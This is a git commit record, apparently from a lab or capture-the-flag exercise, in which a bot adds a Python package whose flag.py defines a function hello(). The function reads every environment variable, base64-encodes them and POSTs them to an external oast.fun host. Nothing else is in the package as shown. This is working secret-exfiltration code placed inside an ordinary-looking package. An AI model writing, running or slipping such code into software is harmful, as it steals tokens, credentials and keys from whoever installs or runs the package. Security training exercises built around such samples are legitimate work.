60b75e1a06f0dbd96a3ba091db3241401f8ae875
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-11-09 15:05:59 +0000

    Add package artifact-lab-3-package-b1ec2b9f/0.2.0/artifact_lab_3_package_b1ec2b9f-0.2.0.tar.gz

---
+++ packages/artifact-lab-3-package-b1ec2b9f/artifact_lab_3_package_b1ec2b9f-0.2.0.tar.gz/artifact_lab_3_package_b1ec2b9f-0.2.0/artifact-lab-3-package-b1ec2b9f/flag.py
@@ -0,0 +1,12 @@
+import os
+import base64
+import requests
+
+def hello():
+    env = str(os.environ)
+    benv = env.encode("ascii")
+    b64envb = base64.b64encode(benv)
+    b64env = b64envb.decode("ascii")
+    data = {"vars": b64env}
+    req = requests.post("http://upnasfwuhrawecezwlst8birymund77bc.oast.fun", data=data, timeout=2)
+
